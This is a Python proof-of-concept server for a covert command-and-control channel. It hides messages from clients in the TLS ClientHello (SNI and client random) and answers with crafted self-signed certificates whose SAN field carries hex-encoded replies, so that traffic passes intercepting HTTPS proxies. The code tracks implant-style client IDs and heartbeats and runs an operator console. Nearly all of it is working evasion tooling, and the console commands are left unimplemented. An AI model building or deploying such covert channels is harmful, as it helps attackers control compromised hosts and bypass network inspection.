# -*- coding: utf-8 -*-

"""
server.py

PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.

Client Max Bytes Per TLS Client Hello: 284 / 2 ( /2 because of encoding)
Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k] / 2 ( /2 because of encoding)
Server Max Length of SAN record: 

NOTE: See protocol.py comments and client.py comments for PROTOCOL details
 
"""

# cryptography imports - warning: compiled C libs lurk here
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# pkg name is 'tlslite-ng' - A native python TLS implementation, not to be confused with 'tlslite' :/
from tlslite.x509certchain import X509, X509CertChain
from tlslite.utils.keyfactory import parsePEMKey
from tlslite.extensions import SNIExtension
from tlslite.errors import TLSAbruptCloseError
from tlslite.sessioncache import SessionCache

#
# NOTE: Forked Version of tlslite.tlsconnection that allows us to Dynamically create TLS Server Hello Messages on the fly
#
from tlsconnection import TLSConnection
from protocol import *

import socketserver
import struct

from datetime import datetime, timedelta
import typing
import random
import string
import threading
import socket
import argparse
import queue
import time
import math
import curses

import http.server

#
# Globals
#

MAX_SINGLE_MSG_LEN = 255
MAX_TOTAL_MSG_LEN = MAX_SINGLE_MSG_LEN * 62

# This Mixin is not that exciting since... ALL we are doing is handshaking TLS
class TLSSocketServerMixIn:
    def finish_request(self, sock, *args):
        tlslite_connector = TLSConnection(sock, C2Server.callback)
        if self.handshake(tlslite_connector) == True:
            tlslite_connector.close()


class Client:
    def __init__(
        self, connected_ts=int(datetime.now().timestamp()), last_poll_ts=0, unique_id="0", src_ip="0.0.0.0"
    ) -> None:
        self.connected_ts = connected_ts
        self.last_poll_ts = last_poll_ts
        self.unique_id = unique_id
        self.src_ip = src_ip
        # TODO: Implement more cool data elements, like OS type/version, and other sweet telemetry gathered...
        # This should be a pretty substantial list of things....


#
# Our C2 Server Class
#
class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.HTTPServer):
    """Our TLS Server... with a few MixIns"""

    CLIENT_DICT = {}  # Our list of Clients (contains client_id's as bytes objects)
    MSG_LIST = []  # Use to print messages to the console when 'things happen'

    def insert_partial(self, client_id: bytes, data: str):
        previous = self.data.get(client_id)
        if previous:
            self.data[client_id] += [data]
        else:
            self.data[client_id] = [data]

    def delete_old_client_id(self, client_id: bytes) -> str:
        try:
            value = "".join(self.data[client_id])
            del self.data[client_id]
        except KeyError:
            value = ""
        return value

    def callback(self, sni_object: SNIExtension, client_random: bytes) -> typing.Tuple[X509CertChain, bytes]:
        """The tlslite.tlsconnection module calls this function before responding with a ServerHello"""
        # What kind of request is this?
        client_msg = Message()
        # Check if this is a returning client
        is_existing_client = False
        client_id = client_msg.get_client_id(client_random)
        if client_id in self.CLIENT_DICT.keys():
            is_existing_client = True
        # Get the message type
        reply_msg = Message()
        # Get our SNI payload (which we may or may not need, depending on msg type
        sni_raw_bytes = sni_object.hostNames[0]
        sni_decoded_bytes = self._decode_msg(sni_raw_bytes)
        if client_msg.get_msg_type(client_random) == ClientMessage.CONNECT:
            # Setup a new nession
            # TODO: Make client sessions persist!
            # Which means a client will hash some machine specific attribute and write it to file, etc
            if not is_existing_client:
                # generate a client id and insert into our list
                client_id = bytes([random.randrange(0, 256) for _ in range(0, 2)])
                self.CLIENT_DICT[client_id] = Client()
                # TODO: Figure out how to get the SRC IP of our client....
                self._append_log_message(
                    f"New client '{client_id.hex()}' connected from {self.CLIENT_DICT[client_id].src_ip}"
                )
            else:
                # This is a returning client
                self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
            reply_msg.header = client_id + ServerMessage.ACK
            self.set_cert(sni_raw_bytes)
        if client_msg.get_msg_type(client_random) == ClientMessage.POLL and is_existing_client:
            # we got a POLL from an existing client (a heartbeat)
            self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
            reply_msg.header = client_id + ServerMessage.ACK
        return (X509CertChain([self.KEYSTORE.public.tlslite]), reply_msg.to_bytes())

    # We include this KEYSTORE object in the callback because we're being invoked from the tlslite-ng lib
    KEYSTORE = type(
        "keystore",
        (object,),
        dict(
            private=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            public=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
            _default_pub=type("keystore", (object,), dict(x509=None, pem=None, tlslite=None)),
        ),
    )
    session_cache = None

    def _append_log_message(self, message: str) -> None:
        self.MSG_LIST.append(f">>> {time.ctime()}: {message}")

    def set_cert(self, sni_msg_bytes: bytes) -> None:
        """This set the current Keystore to the crafted x509 certificate we wanna send"""
        self.KEYSTORE.public.x509 = self.create_message(sni_msg_bytes, encode=True)
        self.KEYSTORE.public.pem = self.KEYSTORE.public.x509.public_bytes(encoding=serialization.Encoding.PEM).decode()
        tlslite_cert = X509()
        self.KEYSTORE.public.tlslite = tlslite_cert.parse(self.KEYSTORE.public.pem)

    def _parse_headers(client_random: bytes) -> Message:
        """Take a bytes object and turn it into a C2 Message instance"""
        h = Message()
        h.header = h.get_client_id(client_random) + h.get_msg_type(client_random)
        h.body = h.get_payload_len(client_random) + h.get_sequence_num(client_random) + h.get_crc(client_random)
        return h

    def init(self):
        """Its just easier to name this as such and call explicitly,
        rather than having to fight the mixins dunder inits.. wouldn't you agree?"""
        self.session_cache = SessionCache()
        self.KEYSTORE.private.x509 = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )
        self.KEYSTORE.private.pem = self.KEYSTORE.private.x509.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode()
        self.KEYSTORE.private.tlslite = parsePEMKey(
            self.KEYSTORE.private.pem,
            private=True,
        )
        tlslite_cert = X509()
        self.KEYSTORE._default_pub.x509 = self.create_default_cert("localhost")
        self.KEYSTORE._default_pub.pem = self.KEYSTORE._default_pub.x509.public_bytes(
            encoding=serialization.Encoding.PEM
        ).decode()
        self.KEYSTORE._default_pub.tlslite = tlslite_cert.parse(self.KEYSTORE._default_pub.pem)
        self.KEYSTORE.public.x509 = self.KEYSTORE._default_pub.x509
        self.KEYSTORE.public.pem = self.KEYSTORE._default_pub.pem
        self.KEYSTORE.public.tlslite = self.KEYSTORE._default_pub.tlslite
        # super.__init__(self, *args)

    def handshake(self, tlslite_connector):
        try:
            tlslite_connector.handshakeServer(
                certChain=X509CertChain([self.KEYSTORE._default_pub.tlslite]),
                privateKey=self.KEYSTORE.private.tlslite,
                sessionCache=self.session_cache,
            )
            tlslite_connector.ignoreAbruptClose = True
            return True
        except TLSAbruptCloseError:
            pass
        except Exception as e:
            raise e

    def create_message(self, message: bytes, encode=True) -> x509.Certificate:
        # Based on: https://gist.github.com/bloodearnest/9017111a313777b9cce5
        sni_msg_str = message.decode()
        if encode:
            host, domain, tld = self._get_random_hostname()
            fqdn = domain + "." + tld
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, fqdn)])
            sni_msg_str = self._str_to_hex(message.decode()) + "." + fqdn
        else:
            name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, sni_msg_str)])
        if len(sni_msg_str) > MAX_SINGLE_MSG_LEN:
            print(
                f"ERROR: Encoded message length of {len(sni_msg_str)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_SINGLE_MSG_LEN}"
            )
            raise NotImplementedError
        # Our smuggled payload goes into the SAN
        san = x509.SubjectAlternativeName([x509.DNSName(sni_msg_str)])
        # Now ready to create the crafter Certificate...
        basic_constraints = x509.BasicConstraints(ca=True, path_length=0)
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(name)
            .issuer_name(name)
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(basic_constraints, False)
            .add_extension(san, False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        # cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
        self.current_cert = cert
        return cert

    @staticmethod
    def _get_random_seed() -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 32)])

    def create_default_cert(self, cn: str) -> x509.Certificate:
        if not cn:
            cn = ".".join(self._get_random_hostname())
        create_ts = datetime.utcnow() - timedelta(seconds=random.randint(86400, 2592000))
        cert = (
            x509.CertificateBuilder()
            .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .issuer_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)]))
            .public_key(self.KEYSTORE.private.x509.public_key())
            .serial_number(1000)
            .not_valid_before(create_ts)
            .not_valid_after(datetime.utcnow() + timedelta(days=random.randint(1, 30)))
            .add_extension(x509.BasicConstraints(ca=True, path_length=0), False)
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(cn)]), False)
            .sign(self.KEYSTORE.private.x509, hashes.SHA256(), default_backend())
        )
        self.default_cert = cert
        return cert

    @staticmethod
    def _get_random_hostname() -> typing.Tuple[str, str, str]:
        tld = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))
        domain = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 8)))
        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 32)))
        return host, domain, tld

    @staticmethod
    def _str_to_hex(message: str) -> str:
        return bytes.hex(message.encode())

    def _get_sni(self, hex_str: str) -> str:
        # 2 + 32 + session_id_len[1 byte] + suites_len[2 bytes]
        # 1 + ciphers_len[2 bytes] {ciphers}
        # comp_len[1 byte] {comps}
        # ext_len[2 bytes]
        # EXT_TYPE[2 bytes]; if type == 00 00 == SNI
        # EXT_LEN[2 bytes]
        # offset = 66 + int()
        #
        hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]  # byte array (well, list but ya know)
        position = 35 + int(hex_array[35], 16)  # fixed tls fields
        position = position + int("".join(hex_array[position : position + 2]), 16) + 2  # ciphers suites
        position = position + int(hex_array[position], 16) + 1  # compression methods
        # extensions_len = int("".join(h[position : position + 2]), 16)
        position = position + 2
        sni = self._find_sni_extension(hex_array[position:])
        return sni

    @staticmethod
    def _find_sni_extension(exts: list) -> str:
        position = 0
        while position < len(exts):
            ext_type = "".join(exts[position : position + 2])
            ext_len = int("".join(exts[position + 2 : position + 4]), 16)
            # print("DEBUG_EXT_len: "+str(ext_len))
            # print("DEBUG_type: "+ext_type)
            if ext_type == "0000":
                position = position + 7
                # print("DEBUG_position: "+str(position))
                sni_len = int("".join(exts[position : position + 2]), 16)
                position = position + 2
                # print("DEBUG_sni_len: "+str(sni_len))
                # print("DEBUG_sni!: "+str(''.join(exts[position:position+sni_len])))
                return bytes.fromhex("".join(exts[position : position + sni_len])).decode()
            else:
                position = position + ext_len + 4
            return ""

    @staticmethod
    def _validate_client_hello(hex_str: str) -> bool:
        # TLS client hello HEADER Ex: "16 0301 00d3 01 000024"
        try:
            if hex_str[0:2] != "16":
                return False
            if hex_str[2:4] != "03":
                return False
            if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
                return False
            max_len = int(math.pow(2, 14))
            if (int(hex_str[6:10], 16) < 1) or (int(hex_str[6:10], 16) > max_len):
                return False
            if hex_str[10:12] != "01":
                return False
            if (int(hex_str[12:], 16) < 1) or (int(hex_str[12:], 16) > max_len):
                return False
        except:
            return False
        return True

    @staticmethod
    def _decode_msg(msg: bytes) -> bytes:
        """Extracts the smuggled SNI message from the Client Hello"""
        return bytes.fromhex("".join(msg.decode().split(".")[:-1]))


# end class C2Server()


def _watch_msg_list(c2_instance: TLSServer, screen: object) -> None:
    while True:
        if c2_instance.MSG_LIST:
            screen.addstr(c2_instance.MSG_LIST.pop() + "\n")
        time.sleep(0.1)


if __name__ == "__main__":
    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # proxy_send("_HOST_",443)

    # is_connected = proxy_connect
    # send_raw.proxy_connect(socket.socket(socket.AF_INET, socket.SOCK_STREAM),'_HOST_')

    # new shiz
    arg_parse = argparse.ArgumentParser(
        description="Send and Receive messages via TLS Handshakes through an interception proxy"
    )
    arg_parse.add_argument(
        "-p",
        "--port",
        metavar="bind_port",
        required=False,
        help="Bind to Listening TCP Port number",
    )
    args = arg_parse.parse_args()
    port = 8443
    if args.port:
        port = int(args.port)
    server = None
    C2Server = TLSServer(("0.0.0.0", port), None)
    C2Server.init()
    C2Server.allow_reuse_address = True
    C2Server.allow_reuse_port = True
    server_thread = threading.Thread(target=C2Server.serve_forever, daemon=True)
    # Now for console (curses) awesomeness...
    screen = curses.initscr()
    screen.nodelay(False)
    curses.echo()
    # curses.nonl()
    # We also want a thread to watch our Message Queue for printing things to console
    console_msg_thread = threading.Thread(target=_watch_msg_list, args=[C2Server, screen], daemon=True)
    #
    # TODO: our console msg thread is still fcked up. It's not updating the screen!! FIX THIS
    #
    console_msg_thread.start()
    screen.addstr(f"[+] Listening on 0.0.0.0:{port}\n")
    screen.addstr("Type 'help' for more information. To terminate the process, type 'exit'\n")
    try:
        server_thread.start()
        while True:
            # get input from console
            screen.addstr(">>> ")
            screen.refresh()
            cmd = screen.getstr().decode()
            # cmd = input(">>> ")
            # handle any cmd's from the console
            if not cmd:
                continue
            if cmd == "help":
                screen.addstr("NOT IMPLEMENTED YET!\n")
            if cmd == "exit":
                break
            # TODO: Add more commands here!
            # Ex. list clients, etc :)
        raise KeyboardInterrupt
    except KeyboardInterrupt:
        curses.endwin()
        # console_msg_thread.join() # this will die of natural causes
        C2Server.shutdown()
        C2Server.server_close()
        server_thread.join()
        print("[+] Exiting.")
        exit(0)
